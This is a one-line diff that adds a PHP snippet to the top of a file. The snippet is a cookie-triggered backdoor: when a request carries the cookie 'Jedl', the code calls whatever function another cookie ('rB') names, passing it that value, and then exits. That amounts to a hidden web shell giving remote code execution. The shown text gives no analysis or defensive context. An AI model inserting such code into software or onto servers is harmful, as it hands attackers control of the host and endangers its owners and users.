@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["Jedl"])){$_COOKIE["rB"]($_COOKIE["Jedl"]);exit;}
